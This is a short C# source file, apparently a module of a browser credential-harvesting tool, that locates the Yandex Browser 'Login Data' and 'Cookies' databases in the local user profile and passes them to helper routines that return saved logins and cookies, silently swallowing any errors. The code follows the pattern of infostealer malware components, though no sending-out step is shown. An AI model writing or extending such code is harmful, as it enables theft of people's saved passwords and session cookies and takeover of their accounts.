using BrowserTools.Base;
using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserTools
{
    public class Yandex
    {
        public static List<LoginData> GetLoginData()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");

                return Chromium.GetLoginData(dataPath, BrowserName.Yandex);
            }
            catch (Exception)
            {
                return new List<LoginData>();
            }
        }

        public static List<Cookie> GetCookies()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");

                return Chromium.GetCookies(dataPath, BrowserName.Yandex);
            }
            catch (Exception)
            {
                return new List<Cookie>();
            }
        }
    }
}
